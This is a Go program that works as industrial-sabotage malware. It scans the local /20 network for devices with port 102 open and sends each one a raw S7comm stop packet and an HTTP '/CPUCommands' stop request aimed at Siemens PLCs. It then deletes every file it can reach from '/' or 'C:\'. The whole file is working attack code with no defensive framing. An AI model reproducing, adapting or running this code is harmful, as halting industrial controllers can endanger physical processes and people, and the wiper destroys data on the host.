package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"net/http"
	"strings"
	"time"
	"runtime"
)

func GetIPAddr() string {
	// Get Interfaces
	addrs, err := net.InterfaceAddrs()

	// Error Checking
	if err != nil {
		fmt.Println("Error getting network interfaces:", err)
	}

	// Get Private Interface
	for _, address := range addrs {
		// only add non loopback IPv4 addresses
		ipnet, ok := address.(*net.IPNet)
		if ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
			var ip_addr = ipnet.IP
			fmt.Println("Found IP Address:", ip_addr.String())
			return ip_addr.String()
		}
	}
	return ""
}

func GetNetwork(ip_addr string) []string {
	// Parse IP Network
	addr, ipnet, err := net.ParseCIDR(ip_addr)
	_ = addr

	// Error Checking
	if err != nil {
		fmt.Println("Error parsing CIDR:", err)
	}

	// Start and Mask
	mask := binary.BigEndian.Uint32(ipnet.Mask)
	start := binary.BigEndian.Uint32(ipnet.IP) + 1

	// Find the final address
	finish := (start & mask) | (mask ^ 0xffffffff)

	// Nil slice
	var ip_list []string

	// Loop through addresses as uint32
	for i := start; i <= finish; i++ {
		// convert back to net.IP
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)
		ip_list = append(ip_list, ip.String())
	}
	fmt.Println("Generated IP List:", ip_list)
	return ip_list
}

func ScanIP(ip_list []string) []string {
	// Nil slice
	var scanned_ips []string

	// Connect to device ports
	for i := range ip_list {
		target := ip_list[i] + ":102"
		fmt.Printf("Scanning IP: %s\n", target)
		conn, err := net.DialTimeout("tcp", target, 1*time.Second)
		if err != nil {
			fmt.Printf("Failed to connect to %s: %v\n", target, err)
			continue
		} else {
			fmt.Printf("Connected to %s\n", target)
			scanned_ips = append(scanned_ips, ip_list[i])
		}
		conn.Close()
	}
	fmt.Println("Scanned IPs with open port 102:", scanned_ips)
	return scanned_ips
}

func KillIP(scanned_ips []string) {
	// Connect to device ports
	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
	for i := range scanned_ips {
		target := scanned_ips[i] + ":102"
		fmt.Printf("Sending stop command to IP: %s\n", target)
		conn, err := net.Dial("tcp", target)
		if err != nil {
			fmt.Printf("Failed to connect to %s: %v\n", target, err)
			continue
		} else {
			_, err = conn.Write([]byte(stop))
			if err != nil {
				fmt.Printf("Failed to send stop command to %s: %v\n", target, err)
			} else {
				fmt.Printf("Stop command sent to %s\n", target)
			}
		}
		conn.Close()
	}
}

func KillHTTP(scanned_ips []string) {
	// Send stop via web interface
	for i := range scanned_ips {
		client := &http.Client{}
		var data = strings.NewReader(`Run=1&PriNav=Stop`)
		url := "http://" + scanned_ips[i] + "/CPUCommands"
		fmt.Printf("Sending HTTP stop command to URL: %s\n", url)
		req, err := http.NewRequest("POST", url, data)
		if err != nil {
			fmt.Printf("Failed to create HTTP request for %s: %v\n", scanned_ips[i], err)
			continue
		}
		req.Header.Set("Host", scanned_ips[i])
		req.Header.Set("Content-Length", "19")
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("Origin", "http://"+scanned_ips[i])
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "Mozilla/5.0. (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
		req.Header.Set("Accept", "text/html, application/xhtml+xml, application/xml; q=0.9,image/avif, image/webp, image/apng,*/*; q=0.8, application/signed-exchange; v=b3; q=0.9")
		req.Header.Set("Referer", "http://"+scanned_ips[i]+"/Portal/Portal.mwsl?PriNav=Start")
		req.Header.Set("Accept-Encoding", "gzip, deflate")
		req.Header.Set("Accept-Language", "en-US, en; q=0.9")
		req.Header.Set("Connection", "close")
		req.Header.Set("Cookie", "siemens_automation_no_intro=TRUE")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Failed to send HTTP request to %s: %v\n", scanned_ips[i], err)
		} else {
			fmt.Printf("HTTP stop command sent to %s\n", scanned_ips[i])
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
}

func KillLinux() {
	// If UID != 0, program deletes files owned by current user
	fmt.Println("Attempting to delete all files on Linux system")
	err := os.RemoveAll("/")
	if err != nil {
		fmt.Println("Failed to delete files on Linux system:", err)
		return
	}
	fmt.Println("Files deleted on Linux system")
}

func KillWindows() {
	// If current user does not have administrative privileges, removes files owned by current user
	fmt.Println("Attempting to delete all files on Windows system")
	err := os.RemoveAll("C:\\")
	if err != nil {
		fmt.Println("Failed to delete files on Windows system:", err)
		return
	}
	fmt.Println("Files deleted on Windows system")
}

func main() {
	ip_addr := GetIPAddr() + "/20"
	fmt.Println("Using IP Address with CIDR:", ip_addr)
	ip_list := GetNetwork(ip_addr)
	scanned_ips := ScanIP(ip_list)
	fmt.Println("Detected vulnerable PLCs:", scanned_ips)

	// PLC STOP to targets
	KillIP(scanned_ips)
	KillHTTP(scanned_ips)

	// Wipe filesystems
	op_sys := runtime.GOOS
	if op_sys == "linux" {
		KillLinux()
	}
	if op_sys == "windows" {
		KillWindows()
	}
}
